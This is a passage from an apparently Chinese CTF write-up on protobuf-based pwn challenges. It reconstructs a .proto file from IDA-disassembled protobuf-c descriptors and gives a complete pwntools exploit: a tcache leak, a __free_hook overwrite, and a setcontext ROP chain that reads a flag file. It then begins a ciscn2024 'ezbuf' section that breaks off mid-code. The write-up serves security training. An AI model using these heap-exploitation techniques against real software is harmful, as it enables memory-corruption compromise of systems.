; XREF: .data.rel.ro:stru_9C80/r</span></span><br><span class="line"><span class="comment">00000000 magic dd ?</span></span><br><span class="line"><span class="comment">00000004 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000005 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000006 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000007 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000008 name dq ?                               ; offset</span></span><br><span class="line"><span class="comment">00000010 short_name dq ?                         ; offset</span></span><br><span class="line"><span class="comment">00000018 c_name dq ?                             ; offset</span></span><br><span class="line"><span class="comment">00000020 package_name dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000028 sizeof_message dq ?</span></span><br><span class="line"><span class="comment">00000030 n_fields dd ?</span></span><br><span class="line"><span class="comment">00000034 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000035 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000036 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000037 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000038 fields dq ?                             ; offset</span></span><br><span class="line"><span class="comment">00000040 fields_sorted_by_name dq ?              ; offset</span></span><br><span class="line"><span class="comment">00000048 n_field_ranges dd ?</span></span><br><span class="line"><span class="comment">0000004C db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004D db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004E db ? ; undefined</span></span><br><span class="line"><span class="comment">0000004F db ? ; undefined</span></span><br><span class="line"><span class="comment">00000050 field_ranges dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000058 message_init dq ?                       ; offset</span></span><br><span class="line"><span class="comment">00000060 reserved1 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000068 reserved2 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000070 reserved3 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000078 ProtobufCMessageDescriptor ends</span></span><br><span class="line"><span class="comment">00000078</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 ProtobufCFieldDescriptor struc ; (sizeof=0x48, align=0x8, copyof_18)</span></span><br><span class="line"><span class="comment">00000000 name dq ?                               ; offset</span></span><br><span class="line"><span class="comment">00000008 id dd ?</span></span><br><span class="line"><span class="comment">0000000C label dd ?</span></span><br><span class="line"><span class="comment">00000010 type dd ?</span></span><br><span class="line"><span class="comment">00000014 quantifier_offset dd ?</span></span><br><span class="line"><span class="comment">00000018 offset dd ?</span></span><br><span class="line"><span class="comment">0000001C db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001D db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001E db ? ; undefined</span></span><br><span class="line"><span class="comment">0000001F db ? ; undefined</span></span><br><span class="line"><span class="comment">00000020 descriptor dq ?                         ; offset</span></span><br><span class="line"><span class="comment">00000028 default_value dq ?                      ; offset</span></span><br><span class="line"><span class="comment">00000030 flags dd ?</span></span><br><span class="line"><span class="comment">00000034 reserved_flags dd ?</span></span><br><span class="line"><span class="comment">00000038 reserved2 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000040 reserved3 dq ?                          ; offset</span></span><br><span class="line"><span class="comment">00000048 ProtobufCFieldDescriptor ends</span></span><br><span class="line"><span class="comment">00000048</span></span><br></pre></td></tr></table></figure><p>这样看起来就舒服多了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009C80                               ; struct ProtobufCMessageDescriptor stru_9C80</span><br><span class="line">.data.rel.ro:0000000000009C80 F9 EE AA 28 00 00 00 00 D0 70+stru_9C80 dd 28AAEEF9h                            ; magic</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 DA 70 00 00+                                        ; DATA XREF: sub_185D+53↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 DA 70 00 00 00 00+                                        ; sub_192D+27↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 E4 70 00 00 00 00 00 00+                                        ; .data.rel.ro:0000000000009D00↓o</span><br><span class="line">.data.rel.ro:0000000000009C80 40 00 00 00 00 00 00 00 04 00+db 4 dup(0)                             ; &quot;devicemsg&quot; ...</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 60 9B 00 00+dq offset aDevicemsg                    ; name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 B0 70 00 00 00 00+dq offset aDevicemsg_0                  ; short_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 01 00 00 00 00 00 00 00+dq offset aDevicemsg_0                  ; c_name</span><br><span class="line">.data.rel.ro:0000000000009C80 C0 70 00 00 00 00 00 00 5D 18+dq offset unk_70E4                      ; package_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dq 40h                                  ; sizeof_message</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; n_fields</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset stru_9B60                     ; fields</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70B0                      ; fields_sorted_by_name</span><br><span class="line">.data.rel.ro:0000000000009C80                               dd 1                                    ; n_field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70C0                      ; field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset sub_185D                      ; message_init</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved1</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 dq offset aActionid                     ; name</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:stru_9C80↓o</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 18 00 00 00 00 00+dd 1                                    ; id ; &quot;actionid&quot;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 00 00 00 00+dd 18h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00                         db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009B60                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009B60                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009B60                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+dq offset aMsgidx                       ; name ; &quot;msgidx&quot;</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 04 00 00 00+dd 2                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 20 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+dd 20h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009BA8 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009BA8                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+dq offset aMsgsize                      ; name ; &quot;msgsize&quot;</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 04 00 00 00+dd 3                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 28 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; type</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+dd 28h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009BF0 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009BF0                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+dq offset aMsgcontent                   ; name ; &quot;msgcontent&quot;</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 0F 00 00 00+dd 4                                    ; id</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 30 00 00 00 00 00+dd 0                                    ; label</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 0Fh                                  ; type</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 0                                    ; quantifier_offset</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+dd 30h                                  ; offset</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00 00 00 00 00 00 00 00 00+db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C38 00 00                         dq 0                                    ; descriptor</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; default_value</span><br><span class="line">.data.rel.ro:0000000000009C38                               dd 0                                    ; flags</span><br><span class="line">.data.rel.ro:0000000000009C38                               dd 0                                    ; reserved_flags</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C38                               dq 0                                    ; reserved3</span><br><span class="line">.data.rel.ro:0000000000009C80                               ; struct ProtobufCMessageDescriptor stru_9C80</span><br><span class="line">.data.rel.ro:0000000000009C80 F9 EE AA 28 00 00 00 00 D0 70+stru_9C80 dd 28AAEEF9h                            ; magic</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 DA 70 00 00+                                        ; DATA XREF: sub_185D+53↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 DA 70 00 00 00 00+                                        ; sub_192D+27↑o</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 E4 70 00 00 00 00 00 00+                                        ; .data.rel.ro:0000000000009D00↓o</span><br><span class="line">.data.rel.ro:0000000000009C80 40 00 00 00 00 00 00 00 04 00+db 4 dup(0)                             ; &quot;devicemsg&quot; ...</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 60 9B 00 00+dq offset aDevicemsg                    ; name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 B0 70 00 00 00 00+dq offset aDevicemsg_0                  ; short_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 01 00 00 00 00 00 00 00+dq offset aDevicemsg_0                  ; c_name</span><br><span class="line">.data.rel.ro:0000000000009C80 C0 70 00 00 00 00 00 00 5D 18+dq offset unk_70E4                      ; package_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dq 40h                                  ; sizeof_message</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; n_fields</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset stru_9B60                     ; fields</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70B0                      ; fields_sorted_by_name</span><br><span class="line">.data.rel.ro:0000000000009C80                               dd 1                                    ; n_field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70C0                      ; field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset sub_185D                      ; message_init</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved1</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved3</span><br></pre></td></tr></table></figure><p>最终可以得出，前面三个成员的数据类型为<code>sint64</code>，最后一个成员的数据类型为<code>bytes</code>，所以可以自己写出<code>proto</code>文件了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message Devicemsg&#123;</span><br><span class="line">required sint64 actionid = <span class="number">1</span>;</span><br><span class="line">required sint64 msgidx = <span class="number">2</span>;</span><br><span class="line">required sint64 msgsize = <span class="number">3</span>;</span><br><span class="line">required bytes msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后只需要使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --python_out=. ./msg.proto</span><br></pre></td></tr></table></figure><p>就可以生成python专用的脚本文件</p><p>之后只需要在exp中import就可以进行序列化交互了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>版本相关</strong></p><p>最后需要注意的是,有时候会因为<u>版本的差异</u></p><p>导致序列化的细节不相同</p><p>所以这时候就需要对应的版本</p><p>可以参考<a href="https://ywhkkx.github.io/2022/11/03/祥云杯CTF2022/"> Pwn进你的心 (ywhkkx.github.io)</a></p><h2 id="ciscn2024-ezbuf"><a href="#ciscn2024-ezbuf" class="headerlink" title="ciscn2024-ezbuf"></a>ciscn2024-ezbuf</h2><p>时隔一年,2024的ciscn又出现了两道protobuf的题目,这是第一天放出的最后一题</p><p>按照之前的方法写出proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Devicemsg</span> &#123;</span><br><span class="line">  <span class="type">bytes</span> whatcon = <span class="number">1</span>;</span><br><span class="line">  <span class="type">sint64</span> whattodo = <span class="number">2</span>;</span><br><span class="line">  <span class="type">sint64</span> whatidx = <span class="number">3</span>;</span><br><span class="line">  <span class="type">sint64</span> whatsize = <span class="number">4</span>;</span><br><span class="line">  <span class="type">uint32</span> whatthis = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后生成python接口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --python_out=. ./ezbuf.proto</span><br></pre></td></tr></table></figure><p>这里在生成的时候遇到了一些问题,即提示版本不适配,</p><p>这个时候去<a href="https://github.com/protocolbuffers/protobuf">protobuf: Protocol Buffers </a>下载要求的protoc版本,并使用其编译</p><p>然后再指定python的protobuf包版本与之匹配即可开始使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install protobuf=version</span><br></pre></td></tr></table></figure><p>然后写出交互函数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = content</span><br><span class="line">msg.whattodo = <span class="number">1</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 